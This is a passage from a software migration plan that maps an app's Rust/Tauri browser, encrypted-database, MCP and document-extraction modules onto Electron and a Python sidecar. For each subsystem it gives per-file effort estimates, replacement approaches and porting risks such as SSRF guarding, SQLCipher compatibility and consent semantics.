| `src/commands/browse/reader.rs` | 298 | electron-main | 1 | Three ipcMain handlers over the same preload read/capture ops; webContents.focus() on the app's WebContents replaces set_focus/makeFirstResponder. The bounds-settle wait (1.5s poll for a real rect) stays if the parked-at-1x1 pattern survives; if the rewrite hides views with setVisible instead of 1x1 parking, the whole too_small_to_read guard can go. |
| `src/web/guard.rs` | 199 | electron-main | 1 | One shared guard.ts: net.isIP + ipaddr.js (or hand-ported range math — it is 30 lines) for classification, URL parsing via the WHATWG URL class, dns.promises.lookup({all:true, verbatim:true}) for resolve-all. This ONE module then feeds the fetch stack, the browser navigation gate, the webRequest sub-resource blocker, and the yt-dlp pre-flight — four consumers, one policy. |
| `src/commands/browse/address.rs` | 189 | renderer | 0.5 | DELETE the duplicate: use the existing src/workspace/address.ts as the single implementation, imported by both the address bar and the Electron-main browse_open handler (main can import the same module). Merge the Rust test case table into the TS test file. |
| `src/snapshot.rs` | 141 | electron-builtin | 0.5 | webContents.capturePage() → NativeImage.toPNG() — a one-liner Electron built-in named in the target decision. Wrap with the same 5s timeout and honest error strings. |
| `src/web.rs` | 96 | electron-main | 0.25 | A types.ts + barrel module in the Electron-main web package; interfaces replace serde structs (shapes already mirrored in src/apiTypes.ts). |

**Commands owned (28):** `browser_navigate`, `browser_close`, `browser_save_page`, `browser_new_tab`, `browser_select_tab`, `browser_close_tab`, `browser_tabs`, `browser_set_bounds`, `browser_info`, `browser_go`, `browser_set_takeover`, `browser_journal`, `browser_clear_journal`, `browser_clear_scope`, `browser_verify_private`, `browser_retry_protection`, `browser_page_text`, `browser_page_selection`, `browser_focus_app`, `browser_search`, `browser_preview`, `import_search_result`, `browser_peek`, `browser_search_summary`, `cancel_media_download`, `list_media_formats`, `import_youtube_video`, `import_media_url`

**Subsystem risks:** (1) ENGINE SWAP CHANGES THE PRIVACY CLAIM: the browser goes WebKit→Chromium. 'Non-persistent WKWebsiteDataStore' becomes an Electron in-memory partition, but Electron keeps some app-global on-disk state (GPU/shader caches, HSTS store per session, DNS cache) — the 'browser keeps nothing' promise and browser_verify_private must be RE-VERIFIED against the new engine, not ported as an assertion; the current code's whole doctrine is that this exact failure is silent. (2) Content blocking moves from WebKit's network-process compiled rules (undetectable, unbypassable by page JS) to main-process webRequest interception — verify @ghostery/adblocker-electron plus the custom private-range handler actually intercept WebSocket connects and service-worker/fetch sub-resources, and that no remote filter-list fetch is enabled (owner: never phone home for a list). The port-scan-via-ws defense has a dedicated rationale in rules.rs and no test today that exercises a live socket. (3) The subsystem is saturated with cross-subsystem seams that must land first or simultaneously: privacy redactor (entities_in/mask_outbound_web/outbound_url_hides), extraction/Readability (saved.rs + fetch_readable — and the split rule says document parsing may belong to the Python sidecar, so decide ONE home), room DB (journal + web cache + file import funnel), agent loop (perceive_image, ToolEffects, turn steps, room_mcp catalog gating), sidecar /web_search. A file-by-file port that stubs these will ship inert fixes — the audit history shows exactly this failure mode. (4) BEHAVIOR ENCODED AS EXACT STRINGS: dozens of error/refusal messages are functional (worded to stop model retry loops, to avoid fabricated reasons, to distinguish 'nothing selected' from 'page refused' by literal string match between Rust and page.js). Treat message text as spec; the NOTHING_SELECTED and READ_MAX cross-file pins must become shared constants, not re-typed prose. (5) SSRF pinning in Node is subtle: undici agents pool per-origin and custom lookup pins per-host — a naively shared agent leaks the pin across hosts, and Node fetch follows redirects by default. The guarded_get structure (fresh pinned client per hop, manual redirect loop, re-guard every hop, resolve-ALL-addresses) must be ported structurally and re-tested with the full guard.rs case tables; WHATWG URL normalization differences vs reqwest::Url can silently change both guard verdicts and cache_key equality. (6) Deleting the workaround layers (ticket bridge, EVAL_LOST taxonomy, sub-frame record defenses, download stat-watcher, NO_POPUPS_JS) is the biggest win but also the biggest risk: each encodes a truthfulness behavior (navigation-interrupted actions reported as 'navigated, later steps did not run', never 'done' or 'failed') that must be re-expressed in Electron's event model. Port the behavior tests (Rust unit tests + e2e/page-script/*.mjs suites) BEFORE the code, and run the wdio capture flow — the repo's history shows fully green suites missing live defects repeatedly. (7) yt-dlp architecture trap: bundling yt-dlp into the PyInstaller sidecar looks cleaner but freezes its update cadence to app releases — the standalone binary + self-update exists because YouTube breaks extractors monthly (Aug 2026 403 wave). Keep the independent binary. Also: child_process kill of yt-dlp does not reliably kill a mid-merge ffmpeg grandchild on macOS — needs process-group handling the Rust code never needed (kill_on_drop covered it). (8) Coordinate-system fidelity for the vision loop: click_at is CSS px, capturePage returns device-scale pixels, and the downscale-to-1280 note math (picture_per_css) currently guards against confidently-wrong factors. NativeImage exposes scaleFactor, so the rewrite can be exact — but if it silently changes the ratio semantics, models will click the wrong elements with no error. (9) The .room migration story intersects here: browse journal rows, web_meta JSON, and the web search/page/image cache tables live in the encrypted room DB; the one-time converter must carry them or Clear-journal/browser history claims silently break for migrated rooms.

### A.5 DB, crypto & rooms

db-crypto-rooms: the encrypted .room (SQLCipher 4) file itself and every room lifecycle path around it. Three strata: (1) the DB layer — src-tauri/src/db.rs + 22 modules under src-tauri/src/db/ (jobs.rs excluded, owned elsewhere) holding the SCHEMA constant, a ~30-step idempotent migrate(), and per-table CRUD for files/chunks/FTS5 search, trash (chunk-moving, not flag-filtering), file versions with pinning, staged artifacts, chats/messages/memories, privacy entities, recordings + crash-recovery PCM checkpoints, voiceprints, podcasts, story lists, skills, workflows and web caches; (2) crypto/unlock — SQLCipher keying pinned in exactly one function (apply_key), wrong-password vs damaged-file classification, AES-GCM+PBKDF2 recovery-code sidecar, SQLCipher rekey, Touch ID via Keychain SecAccessControl; (3) lifecycle commands — create/open/close/rename room with a strictly-ordered teardown (browser closed and jobs parked BEFORE the DB handle drops, epoch bump against straggler writers), whole-room checkpoints (VACUUM INTO + plaintext manifest sidecar with self-healing reconcile) and rollback with drain-and-refuse semantics, the ⌘Q unsaved-edits quit door, and window-geometry persistence with an off-screen-restore guard. Rewrite target: everything lands in Electron main on better-sqlite3-multiple-ciphers (owner explicitly allows replacing SQLCipher provided existing .room files migrate); Touch ID and quit/geometry move to Electron built-ins. 21 tauri commands in this group. The dominant migration risk is opening existing SQLCipher-4 .room files and preserving ~40 comment-defended invariants (born-current user_version stamp, single keying site, teardown ordering, trash chunk-move) whose regression is silent data loss.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/db/schema.rs` | 2125 | electron-main | 5 | TS module in Electron main on better-sqlite3-multiple-ciphers opened with SQLCipher-compatible settings (cipher='sqlcipher', legacy=4) so existing .room files open unmodified — this IS the migration story; keep SCHEMA as one SQL string, port migrate() statement-for-statement, applyKey() stays the single keying+pinning function, read-only opens via {readonly:true}. |
| `src/db/files.rs` | 2039 | electron-main | 4 | Direct TS port over better-sqlite3: inTransaction wraps db.transaction-style BEGIN IMMEDIATE with an is-autocommit check (db.inTransaction), prepared statements per query; blobs as Buffer. The fuzzy-finder SQL (LIKE with ESCAPE, ORDER BY created_at DESC, rowid tiebreak) ports verbatim. |
| `src/commands/rooms.rs` | 958 | electron-main | 4 | TS in Electron main: ipcMain.handle endpoints replacing #[tauri::command]; a RoomState singleton owning {db, path, name, password}; teardown as one ordered function (close browser BrowserView/WebContentsView → park jobs while DB open → drop handle → bump epoch → stop MCP bridge + discovery file → clear consents/caches/previews → notify sidecar forget_room_memory); drain with AbortController-style flags and bounded waits. |
| `src/commands/room_checkpoints.rs` | 890 | electron-main | 3 | TS in main: VACUUM INTO through better-sqlite3 (must run in the DB worker — it holds the connection for the whole multi-GB copy); fs.statfs (Node ≥18.15) replaces shelling to /bin/df; manifest writes via write-temp-fsync-rename with mode 0o600; the rollback state machine as one async function with a finally-cleared busy flag. |
| `src/db/versions.rs` | 642 | electron-main | 2.5 | Version CRUD ports straight to TS/better-sqlite3. Recovery crypto via node:crypto (crypto.pbkdf2Sync sha256 200k iters; createCipheriv/createDecipheriv aes-256-gcm with the 16-byte tag appended to ct — the on-disk RecoveryWrap JSON {v,salt,nonce,ct} must stay byte-compatible so existing sidecars keep working). rekey via PRAGMA rekey on better-sqlite3-multiple-ciphers; VACUUM INTO with single-quote escaping (no bound params allowed). |
| `src/db/workflows.rs` | 586 | electron-main | 1 | TS port; definition/binding stored as JSON text, surfaced parsed (callers never re-parse). |
| `src/db/story.rs` | 573 | electron-main | 1 | TS port, straightforward CRUD. |
| `src/db/artifacts.rs` | 451 | electron-main | 1.5 | TS port; commit_staged as one better-sqlite3 transaction that snapshots the existing artifact (snapshot_file_version), overwrites content, transfers provenance, and deletes the staging row. MAX_ARTIFACT_BYTES=64MB cap stays. |
| `src/db/skills.rs` | 449 | electron-main | 1 | TS port; keep the SKILL_GONE stale-save error contract. |
| `src/db/podcasts.rs` | 437 | electron-main | 1 | TS port; the strip_speaker_label / normalize_turn_speakers string logic moves as pure functions with their tests. |
| `src/db/messages.rs` | 395 | electron-main | 1 | TS port. recent_messages' handoff-anchored window and the kind column semantics must survive — the sidecar's context compaction depends on them. |
| `src/db/privacy.rs` | 390 | electron-main | 1 | TS port; sha256 via node:crypto. The placeholder-series allocation (next free '[Person N]' per category) ports as a query + counter. |
| `src/db/voices.rs` | 370 | electron-main | 1 | Table stays in main (TS); the diarization consumer moves to the Python sidecar, so main must ship known_voices/rejects to the sidecar per recognition request over the local HTTP seam (embeddings are ~192-float blobs — cheap), and receive enroll/reject writes back. |
| `src/db/embeddings.rs` | 353 | electron-main | 1.5 | TS port: Buffer→Float32Array (LE matches JS TypedArray on all supported platforms), cosine in a tight loop; FTS queries verbatim. If the full-scan cosine over ~20k×768 f32 proves slow on the main thread, move scoring into the DB worker thread — embedding GENERATION stays in the Python sidecar per the split rule, only storage/scoring is here. |
| `src/db.rs` | 338 | electron-main | 1.5 | TS module in Electron main over better-sqlite3-multiple-ciphers: one shared column-list constant + row mapper, insertChunks/clearChunks using SAVEPOINT (db.exec) around a prepared-statement loop. Hebrew nikud stripping and chunk_text come from wherever the extraction port lands (Python sidecar) — precompute chunks before the synchronous DB write, or port the two small string functions to TS so indexing stays local to main. |
| `src/db/recordings.rs` | 313 | electron-main | 1.5 | TS port in main: PCM conversion is a few lines over Float32Array/Int16Array; WAV decode/encode helpers (44-byte header math) port to TS or call the Python sidecar's audio lane — recommend TS since recovery runs synchronously at unlock and the WAV format here is fixed 16-bit mono. |
| `tests/roomfile.rs` | 289 | electron-main | 1 | Vitest/node:test integration suite against the TS db layer: same hand-built legacy fixtures (plain better-sqlite3 with PRAGMA key writing old schemas), same on-disk plaintext probes. These are the acceptance tests for 'existing .room files still open' — port FIRST and run against real field rooms too. |
| `src/db/memories.rs` | 274 | electron-main | 0.5 | TS port; reuses the shared TrashActor and like-escape helpers. |
| `src/db/web_cache.rs` | 261 | electron-main | 0.5 | TS port; TTLs expressed with the same SQLite datetime arithmetic. |
| `src/db/folders.rs` | 218 | electron-main | 0.5 | TS port; map SQLITE_CONSTRAINT_UNIQUE to the friendly message. |
| `src/biometrics.rs` | 218 | electron-builtin | 2 | Electron built-ins: systemPreferences.promptTouchID('unlock <room>') as the gate, then decrypt a per-room secret sealed with safeStorage (Keychain-backed) from app data. Weaker than SecAccessControl: the OS no longer hardware-binds the read to the biometric match, and re-enrolling a finger no longer auto-invalidates the item — document the trade or emulate invalidation by storing the enrollment state. |
| `src/db/util.rs` | 213 | electron-main | 0.5 | Thin TS helpers over better-sqlite3 (stmt.all/get/run; run().changes drives executeExisting). Error-message parity matters less than the missing-vs-broken distinction. |
| `src/commands/window_geometry.rs` | 199 | electron-main | 0.5 | TS in main: BrowserWindow getBounds/setBounds + screen.getAllDisplays; same JSON file in app.getPath('userData'); port geometry_is_usable verbatim (it is the whole point — the file explicitly rejects the window-state plugin because it restores unchecked). Skip isFullScreen rectangles. |
| `src/db/browse.rs` | 194 | electron-main | 0.5 | TS port, three prepared statements. The session (sitting) column semantics carry over unchanged. |
| `src/db/chats.rs` | 170 | electron-main | 0.5 | TS port; the COALESCE(last message stamp, own created_at) ordering query ports as-is. |
| `src/commands/shell_exit.rs` | 151 | electron-main | 0.5 | Electron's before-quit fires for ⌘Q/Dock/menu quit and supports preventDefault — the whole reason this module exists disappears. Keep the same protocol: main holds unsavedEdits+quitHeld booleans (ipcMain from renderer), before-quit preventDefaults once when dirty and sends 'quit-requested'; renderer answers with app.quit() or rearm. ~40 lines. |
| `tests/roomai_cli.rs` | 106 | electron-main | 0.5 | The CLI itself must be re-implemented as a small Node script (bin/roomai.ts over the same db layer, read-only opens for verify/info); test via child_process.execFile in vitest with the same env-var contract. Note: the CLI binary source is outside this group — coordinate with whoever owns src-tauri/src/bin/, but this test defines its contract. |
| `src/db/meta.rs` | 41 | electron-main | 0.1 | Two prepared statements in TS. |
| `src/db/settings.rs` | 17 | electron-main | 0.1 | Two prepared statements in TS. |

**Commands owned (21):** `create_room`, `open_room`, `take_rec_recovery_error`, `write_recovery_key`, `has_recovery_key`, `open_room_with_recovery`, `touchid_has`, `touchid_enable`, `touchid_disable`, `touchid_open`, `close_room`, `room_info`, `rename_room`, `take_pending_open`, `list_stranded_checkpoints`, `create_room_checkpoint`, `list_room_checkpoints`, `delete_room_checkpoint`, `rollback_room_checkpoint`, `set_unsaved_edits`, `quit_guard_rearm`

**Subsystem risks:** (1) SQLCipher compatibility is the make-or-break: better-sqlite3-multiple-ciphers must open real field .room files with cipher='sqlcipher' legacy=4 (PBKDF2-SHA512/256k, HMAC-SHA512) INCLUDING files that have been re-keyed and checkpoint .roomck copies; prove it on actual user rooms in week 1, and keep the one-time VACUUM-INTO converter as the sanctioned fallback (owner allows it). Whatever lands, re-create the apply_key invariant: exactly ONE function keys AND pins, enforced by a lint/test — two of four Rust call sites once drifted. (2) better-sqlite3 is synchronous: migrate() on old rooms, embedding-null repairs, VACUUM, and multi-GB VACUUM INTO checkpoints will freeze the Electron main thread and every window. The DB must live in a worker_threads/utilityProcess with an async RPC facade — but that reintroduces interleaving the Rust Mutex<Connection> prevented; every multi-statement invariant (trash chunk-move, staged-artifact commit, finalize_rec_audio) must execute as one synchronous transaction inside the worker, never as multiple round-trips. (3) Teardown/rollback ordering is where silent data corruption lives: browser flushed and jobs parked BEFORE the handle drops, epoch bump against path-pinned stragglers, rollback's drain-and-refuse, busy-flag cleared on every exit path (Rust used a Drop guard; JS needs try/finally discipline). The Rust test suite encodes these orderings against a mock runtime — port those tests, not just the code, and remember the standing lesson that agent-written 'fixes' have shipped inert before (run the equivalent of `cargo check | grep 'never used'` on the TS port). (4) Migration fidelity for old rooms: every guarded ALTER, both-places table minting (SCHEMA + migrate), user_version born-current stamping, and the three one-time repairs must port statement-for-statement; getting library_visibility defaults wrong empties every field room's Library with zero errors (the schema tests call this indistinguishable-from-data-loss). The include_str! structural guards (CURRENT_USER_VERSION lockstep, single keying site) need TS equivalents. (5) Touch ID semantics weaken: Electron has no SecAccessControl/biometryCurrentSet, so promptTouchID + safeStorage means the secret is no longer hardware-gated to the enrolled biometric set and re-enrollment no longer invalidates it; also safeStorage invalidates on signing-identity change (keep the existing signing key and 'PrivateRoom' Keychain naming — rebrand memory says never rotate them). Owner should sign off on the reduced model explicitly. (6) Blob memory and perf: 200MB recording versions, checkpoint payloads and original_bytes all become whole Buffers over IPC boundaries (Rust streamed within one process); budget for chunked reads or keep blob-heavy operations entirely inside the DB worker. The cosine full scan (for_each_chunk_embedding) moves from Rust to JS — fine at 20k chunks but measure, with sqlite-vec as the escape hatch. (7) Cross-boundary data flows that didn't exist in the monolith: voiceprints (DB in Electron main) consumed by diarization (Python sidecar), rec_chunks PCM written by the audio pipeline (Python) but recovered at unlock (main), privacy entities read by the redaction seam — each needs an explicit IPC/HTTP contract or the invariants (voices never reach a model; recovery is transactional) quietly break. (8) The plaintext sidecars (.recovery wrap, .checkpoints/manifest.json 0600) and the .roomck payloads are user-visible on-disk contracts: byte-compatible RecoveryWrap JSON, same paths, same temp-then-rename atomicity (fs.writeFile truncate-first is the exact bug the Rust code fixed), same 0600 mode on the manifest. (9) Window-geometry file units change (tao physical px → Electron DIP): version window.json or old files restore wrong-sized windows; and delete the ⌘Q menu workaround rather than porting it — Electron's before-quit genuinely fires for macOS Quit, unlike tao.

### A.6 MCP (client + room server)

MCP subsystem: (1) an outbound MCP CLIENT (mcp.rs) speaking both stdio JSON-RPC and streamable-HTTP to user-configured connectors; (2) the room's own MCP SERVER bridge (room_mcp.rs) — a loopback, bearer-token, scope-tiered HTTP endpoint that is THE tool surface for every engine (local Python sidecar, cloud CLI engines, consulted advisors, opted-in external agents) and the app's central security boundary; (3) the command/consent layer (mcp_cmds.rs) with SEC-1 per-Mac fingerprint approvals, per-call consent cards, per-connector auto-approve/unmask powers, per-tool opt-outs, and agent-facing connector CRUD with credential masking; (4) a full OAuth 2.1 client (mcp_oauth.rs) — RFC 9728/8414/7591/7636 discovery, dynamic registration, PKCE loopback flow, SSRF-guarded with DNS pinning, and a refresh state machine distinguishing rejected vs unreachable; (5) the connector marketplace (mcp_registry.rs) reading the official MCP registry behind an explicit opt-in, normalizing entries local-first and inlining icons in bounded SSRF-checked waves; (6) an e2e stdio-client test (tests/mcp_client.rs). Rewrite target: the client and much of the bridge transport map onto @modelcontextprotocol/sdk (TS) in Electron main; the consent/approval/scope/OAuth-state logic is bespoke and must be ported behavior-for-behavior. Total ~9,340 lines (roughly a third of it in-file unit tests that pin the invariants). 21 #[tauri::command] handlers become IPC handlers. Estimated ~23.5 senior-dev days.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/room_mcp.rs` | 3096 | electron-main | 8 | TS in Electron main: a node:http server bound to 127.0.0.1 (or @modelcontextprotocol/sdk Server + StreamableHTTPServerTransport with an auth middleware), crypto.timingSafeEqual bearer check, 16MB body cap enforced on the Content-Length declaration, and a direct port of ToolScope, served_tools, the proxy tools, and tool_call dispatching into the rewritten exec_tool (also TS in main). Keep the shutdown watch semantics via AbortController fan-out to live sockets. |
| `src/commands/mcp_cmds.rs` | 2715 | electron-main | 6 | TS module in Electron main: 18 ipcMain.handle endpoints; approvals/flags as JSON files under app.getPath('userData'); consent cards via webContents.send('mcp-approve-request') + a pending-promise map resolved by the renderer's resolve_mcp_call IPC (180s timeout = decline); config and tool prefs in the room DB settings table; pure helpers (fingerprint = sha256 hex, resigned_servers, same_destination, set_server_disabled, merge_bearer/strip_bearer, redact_cli_args/restore_redacted_args, preview_args, mcp_gate) port 1:1 with their vitest tests. |
| `src/commands/mcp_oauth.rs` | 1313 | electron-main | 4 | TS in Electron main: node:crypto (randomBytes + sha256 base64url) for PKCE/state, node:http on 127.0.0.1:0 for the callback listener, shell.openExternal for the browser, undici with a custom dns-pinning Agent (port of web::resolve_public_addr) and redirects=manual re-checked per hop for all discovery/registration/token requests. The @modelcontextprotocol/sdk client-auth helper implements the same RFC chain but NOT the SSRF guard or the refresh state machine — use it at most for metadata parsing; the flow orchestration here is worth porting directly. Pure pieces (parse_www_authenticate, well_known_prm, auth_metadata_urls, merge_refreshed, parse_token_response, callback parsing, urldecode) port 1:1. |
| `src/mcp.rs` | 1146 | electron-main | 3 | Use @modelcontextprotocol/sdk Client with StdioClientTransport (stderr:'pipe' to keep the stderr-tail error messages) and StreamableHTTPClientTransport. Keep as thin TS wrappers: parse_config, config_key, sanitize_tool_name, flatten_call_result (with its image count/size/MIME bounds), and auth_error_message port 1:1 as pure functions with vitest tests. Fix GUI PATH via the same `zsh -lc` probe (or fix-path npm) before spawning uvx/npx. |
| `src/commands/mcp_registry.rs` | 933 | electron-main | 2 | TS in Electron main: three ipcMain handlers; fetch via undici with 45s timeout + 2 retries with backoff; normalize_servers and all its helpers are pure JSON functions that port 1:1 with their vitest tests; icon fetches through an undici client whose per-hop redirect handling re-runs the public-address check (redirect:'manual' loop capped at 10), inlined as data: URIs (renderer CSP still blocks remote images); opt-in flag file in userData. |
| `tests/mcp_client.rs` | 139 | electron-main | 0.5 | Port as a vitest integration test spawning the same inline python3 fake server (or an equivalent node -e fake) against the TS client wrapper; keep the stray-notification + stdout-noise + isError-to-throw + stderr-in-error assertions verbatim, and keep the ignored/opt-in live uvx test. |

**Commands owned (21):** `mcp_get_config`, `mcp_apply_config`, `get_mcp_connector_powers`, `set_mcp_connector_power`, `get_mcp_auto_approve`, `set_mcp_auto_approve`, `get_mcp_outbound_unmask`, `set_mcp_outbound_unmask`, `approve_mcp`, `mcp_status`, `mcp_oauth_authorize`, `mcp_oauth_status`, `mcp_oauth_sign_out`, `mcp_set_server_enabled`, `mcp_remove_server`, `mcp_get_tool_prefs`, `mcp_set_tool_enabled`, `resolve_mcp_call`, `mcp_registry_optin_status`, `set_mcp_registry_optin`, `mcp_registry_search`

**Subsystem risks:** (1) room_mcp.rs is the security boundary for EVERY engine tier — a scope leak in the TS port (one wrong matches! equivalent) silently hands job/UI/connector tools to cloud advisors or external agents. The ~1,265 lines of tier tests must be ported first and treated as the acceptance gate, and the port cannot start until exec_tool/tools_catalog/redaction land in TS (hard sequencing dependency on the commands and privacy subsystems). (2) SSRF regression is the single most likely rewrite-introduced vulnerability: mcp_oauth and mcp_registry rely on literal checks + DNS resolution/pinning + hand-computed re-guarded redirects. Node fetch/undici follow redirects and resolve DNS at connect by default; a naive fetch() port reopens DNS-rebinding and redirect-to-loopback against every connector-chosen URL. The web::check_public_http_url / resolve_public_addr guard must be ported as a shared TS module BEFORE any of these files. (3) Consent semantics are owner decisions, not implementation details: auto-approve vs outbound-unmask stay separate powers, per-connector overrides inherit via Option-not-bool, absent-file-fails-closed, persist-before-flip, name-keyed grants forgotten on removal/retarget, destructive-delete cards bypass all standing consent. Any 'simplification' here is a regression against 2026-08-03 owner decisions. (4) The .room migration must decide the fate of three MCP-adjacent stores: the config text (fingerprint approvals hash exact bytes — reformatting re-prompts every room; silent auto-approval is unacceptable), oauth:* token settings (dropping them signs every remote connector out), and per-Mac files (approvals, flags, connector powers) which must move Tauri app_data_dir → Electron userData or every consent decision is lost/re-granted. (5) Adopting @modelcontextprotocol/sdk wholesale loses hard-won behaviors: WWW-Authenticate capture for the sign-in-vs-bad-token message, stdout-noise tolerance, stderr-tail error surfacing, the bounded image flattening, the Rejected-vs-Unreachable refresh split, and the body-cap-before-auth ordering on the server side. Use the SDK for transport plumbing, keep the app's policy layer hand-ported with its tests. (6) Electron main GUI processes get the same bare macOS PATH as Tauri — without the login-shell PATH fix (plus prepending the app's downloaded-runtime cache dir), every uvx/npx stdio connector fails to spawn on end-user machines while working in dev. (7) Connection carry-over (config_key) and the generation counter prevent connector-restart storms and stale-connect races; both are easy to drop in a 'clean' rewrite and their absence only shows as seconds of 'connecting…' plus lost sessions on every settings change — port them and their tests deliberately. (8) run_mcp_tool's annotations (destructiveHint:false) and preserved connector annotations are load-bearing for non-interactive Codex clients; changing them makes Codex-engine rooms refuse all connector calls with no visible cause.

### A.7 Documents & extraction

Documents-extraction subsystem: the entire "what is this file and what does it say" pipeline of Arcelle. ~13.6k lines of Rust across 29 files. Three layers: (1) pure extractors (src-tauri/src/extraction.rs + extraction/ dir) that turn bytes of ~40 formats into indexable text with hard-won correctness invariants (encoding detection with provenance, RTF/legacy-Office native readers, visual-Hebrew RTL repair, PDF quality judging, decompression-bomb caps, panic containment); (2) macOS-native rendering/recognition (ocr.rs Vision OCR with PDF rasterization, quicklook.rs QuickLook thumbnails, office.rs textutil HTML + pptx slide-reorder trick); (3) file-lifecycle commands (files.rs import/download/trash/content funnels with OCR/STT job lanes and epoch pinning, spreadsheet/docx in-place editing that preserves formatting, library/folders/memories, recents, organize batch verbs, generated-doc HTML templating, deterministic cast/script parsers). 36 tauri commands. Rewrite splits: extractors + OCR/QuickLook/textutil + edit matchers go to the Python sidecar (PyObjC for Vision/QuickLook is explicitly allowed); DB-touching command funnels, format registry, and HTML templating go to Electron main in TS. The dominant risk is silent parity drift: every extractor's output IS the search index and the model's view of the room, and dozens of comments document one-line invariants that fixed live-QA failures — these must be treated as a spec, with golden-fixture diff tests against the Rust output before cutover.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/commands/files.rs` | 1647 | electron-main | 5 | The heart of Electron main: better-sqlite3-multiple-ciphers for the DB, an async import queue (worker_threads or just sequential awaits) calling the sidecar for extraction/OCR/STT, webContents.send for the seven event channels, a protocol.handle('roommedia') stream with Range support replacing stage_media_bytes, and the web funnels calling main's fetch layer. |
| `src/extraction.rs` | 1406 | python-sidecar | 4 | Python module in arcelle_sidecar: dispatch table + per-format readers; encoding via chardetng-py or charset-normalizer wrapped in a WHATWG-name shim so reported names match encoding_rs ('windows-1254' not 'cp1254'); zipfile for EPUB/iWork/zip entries with the same 100MB inflate cap; RTF tokenizer ported line-for-line (striprtf loses the cp1252 high band and \uc handling, so port the hand parser). |
| `src/commands/organize.rs` | 810 | electron-main | 2 | TS port in main as tool-execution handlers the sidecar's agent invokes over the host-tool channel; keep the OrganizeReport.sentence() receipt wording. |
| `src/commands/docs_html.rs` | 772 | electron-main | 1.5 | TS module in main beside the DB/Artifact layer; the CSS constants move with it (or better: generate both tokens.css and this constant from one source file at build time, killing the hand-mirror); open_scratch_pad stays an IPC command. |
| `src/extraction/legacy.rs` | 722 | python-sidecar | 3 | Python: textutil shell-out with the SAME two gates ported; olefile (pure-python, standard) replaces the hand OLE reader; the ppt record walker ports directly (RT_TEXT_CHARS/RT_TEXT_BYTES atoms, depth cap 24); python-calamine (prebuilt wheels, same underlying crate) for .xls/.ods so cell rendering matches the xlsx reader's layout. |
| `src/extraction/article.rs` | 692 | electron-main | 2.5 | @mozilla/readability (the decided library) over linkedom/happy-dom in Electron main, with a small meta harvester (og:*, JSON-LD, <html lang>) and turndown configured to NOT escape punctuation in prose; sidecar calls into main over the local channel when import needs an article, or the HTML branch of import runs in main before handing text to the indexer. |
| `src/commands/shotsplit.rs` | 689 | python-sidecar | 1.5 | Python port beside the create/story generation flows; keep the reassembly-equals-original property test. |
| `src/commands/spreadsheet.rs` | 618 | electron-main | 2.5 | CSV/TSV logic ports to TS in Electron main (pure string work, and the grid's editor is the caller — keeping it near the DB write avoids a sidecar round-trip); xlsx set_cell goes to the sidecar as a raw-XML sheet splice (change one <c> element in the target sheet part, copy the rest of the zip raw) rather than openpyxl, which drops charts/pivots on rewrite. |
| `src/extraction/html_edit.rs` | 608 | python-sidecar | 2.5 | Python port beside the docx matcher, sharing the one fold table; spans are byte offsets into the raw markup string, entity decode returns (char, bytes-consumed) pairs exactly as here. |
| `src/extraction/data.rs` | 535 | python-sidecar | 1.5 | Python: json for ipynb, stdlib email package (message_from_string + get_body/walk) replaces the entire hand-rolled MIME stack, re-based cue/svg extractors, zipfile.namelist for archives. Cap logic ported as-is. |
| `src/commands/office.rs` | 449 | python-sidecar | 2.5 | Python: the sldIdLst splice (find_tag_body/split_self_closing port) + zipfile raw copy, QuickLook render via the quicklook port, sha-keyed cache dict with oldest-eviction; textutil -convert html shell-out + field-code resolver. Electron main exposes the IPC command and forwards; PNG returned as bytes not base64 if the channel allows. |
| `src/extraction/docx.rs` | 448 | python-sidecar | 3 | Python port operating on document.xml as a raw string (NOT python-docx, which re-serializes and loses fidelity): same scan_docx_text char-map with NUL paragraph sentinels, same fold table import, zipfile raw-copy for untouched entries. |
| `src/ocr.rs` | 420 | python-sidecar | 2.5 | PyObjC in the sidecar: Vision (VNRecognizeTextRequest + VNImageRequestHandler, synchronous performRequests) for recognition; rasterize PDF pages with pypdfium2 (simpler than a PyObjC CGBitmapContext port, prebuilt wheels) applying the same scale/area/edge caps, encode PNG with Pillow or hand pixels to Vision as CGImage. |
| `src/commands/castparse.rs` | 399 | python-sidecar | 1 | Python port beside the story flows in the sidecar; ParsedMember keeps camelCase serde names (the shape round-trips to the preview UI and back with edits). |
| `src/extraction/pptx.rs` | 301 | python-sidecar | 1 | Python zipfile + the same xml_paras_to_text approach (replace </a:p> with newline, strip tags); do NOT use python-pptx (heavier, and its text model skips chart/diagram parts this reader deliberately includes). |
| `src/formats.rs` | 299 | electron-main | 1 | TS module in Electron main (used by get_file_content's successor and shareable with the renderer as types); keep the frontend registry test that asserts a component exists for every kind so drift stays a failing test. |
| `src/extraction/window.rs` | 292 | python-sidecar | 1 | Direct Python port inside the sidecar's summarize/read-file tooling; pure functions, port with the existing tests. |
| `src/commands/docs_html/minutes.rs` | 285 | python-sidecar | 0.5 | Python port inside the sidecar's minutes flow (the model call already lives there): same schema dict, same merge with ordered case-insensitive dedup; rendering can call main's html_document or duplicate the template. |
| `src/extraction/xlsx.rs` | 267 | python-sidecar | 1.5 | python-calamine (prebuilt, reads populated cells lazily) for extraction — NOT openpyxl for reading (slow on big books); re-implement both zip-size guards with zipfile before handing bytes to any parser. |
| `src/quicklook.rs` | 253 | python-sidecar | 1.5 | PyObjC QLThumbnailGenerator (generateBestRepresentationForRequest_completionHandler_ with a threading.Event + 20s timeout; representationTypes=All), NSBitmapImageRep PNG encode; temp hygiene ported exactly (0600 from creation via os.open(O_CREAT/O_EXCL, 0o600), uuid stem, extension preserved, finally-delete). |
| `src/commands/library.rs` | 251 | electron-main | 1 | Direct TS port over the DB layer in main; the set_setting→refresh_policy hook must call whatever owns the privacy-policy cache in the new split. |
| `src/commands/docx_edit.rs` | 231 | electron-main | 1.5 | IPC handler in Electron main doing the paragraph diff + orchestration; the actual splice call goes to the sidecar's docx matcher port; DB write via store_file_bytes' successor (snapshot + overwrite in one transaction). |
| `src/extraction/pdf_quality.rs` | 226 | python-sidecar | 0.5 | Direct Python port of the ratio checks and choose(); constants unchanged; sits between extraction and the OCR queue decision in the import pipeline. |
| `src/commands/recent.rs` | 226 | electron-main | 0.5 | TS in main using app.getPath('userData'): fs.openSync with mode 0o600 + fchmodSync (re-tighten existing files), write tmp + rename, fs.existsSync in a worker or async stat for the missing check. |
